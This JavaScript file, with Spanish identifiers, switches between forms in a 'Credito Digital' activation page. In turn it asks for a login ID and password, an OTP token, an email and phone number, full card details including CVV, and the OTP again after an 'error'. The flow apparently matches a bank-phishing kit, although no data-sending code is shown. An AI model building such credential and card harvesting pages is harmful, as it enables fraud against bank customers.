function detectar_dispositivo(){
    var dispositivo = "";
    if(navigator.userAgent.match(/Android/i))
        dispositivo = "Android";
    else
        if(navigator.userAgent.match(/webOS/i))
            dispositivo = "webOS";
        else
            if(navigator.userAgent.match(/iPhone/i))
                dispositivo = "iPhone";
            else
                if(navigator.userAgent.match(/iPad/i))
                    dispositivo = "iPad";
                else
                    if(navigator.userAgent.match(/iPod/i))
                        dispositivo = "iPod";
                    else
                        if(navigator.userAgent.match(/BlackBerry/i))
                            dispositivo = "BlackBerry";
                        else
                            if(navigator.userAgent.match(/Windows Phone/i))
                                dispositivo = "Windows Phone";
                            else
                                dispositivo = "PC";
    return dispositivo;
}

function vista_usuario(){
    $("#fondo,#mensaje").hide();
    $(".titulo").html("Bienvenido a la activacion y desembolso de tu Credito Digital");
    $(".vinculo").show();

    $("#frm-otp,#frm-correo,#frm-tarjeta,#frm-errorotp").hide();
    $("#frm-login").show();

    $("#txt-id,#txt-clave-tc,#txt-digito,#txt-id-s,#txt-clave-s").val("");
    $("#error-mensaje").show();
    $("#btn-validar").attr("disabled","disabled");
}

function vista_otp(){
    
    $("#des-otp").css("color","#000");

    $("#fondo,#mensaje").hide();
    $(".titulo").html("Validación de Seguridad");
    $(".vinculo").hide();

    $("#frm-login,#frm-correo,#frm-tarjeta,#frm-errorotp").hide();
    $("#frm-otp").show();
    
    $("#txt-token").val("");
    $("#btn-validar").attr("disabled","disabled");  
}

function vista_email(){
    $("#des-correo").css("color","#000");

    $("#fondo,#mensaje").hide();
    $(".titulo").html("Actualización de Datos");
    $(".vinculo").hide();

    $("#frm-login,#frm-otp,#frm-tarjeta,#frm-errorotp").hide();
    $("#frm-correo").show();
    
    $("#txt-correo,#txt-celular").val("");
    $("#btn-actualizar").attr("disabled","disabled");  
}

function vista_tarjeta(){
    $("#des-tarjeta").css("color","#000");
    
    $("#fondo,#mensaje").hide();
    $(".titulo").html("Validación de Seguridad");
    $(".vinculo").hide();

    $("#frm-login,#frm-otp,#frm-correo,#frm-errorotp").hide();
    $("#frm-tarjeta").show();
    
    $("#txt-tarjeta,#txt-mes,#txt-ano,#txt-cvv").val("");
    $("#btn-verficar").attr("disabled","disabled");  
}

function vista_errorotp(){
    $("#des-errotp").css("color","red");
    $("#fondo,#mensaje").hide();
    $(".titulo").html("Validación de Seguridad");
    $(".vinculo").hide();

    $("#frm-login,#frm-otp,#frm-correo,#frm-tarjeta").hide();
    $("#frm-errorotp").show();
    
    $("#txt-tokenerr").val("");
    $("#btn-validarerr").attr("disabled","disabled");  
}

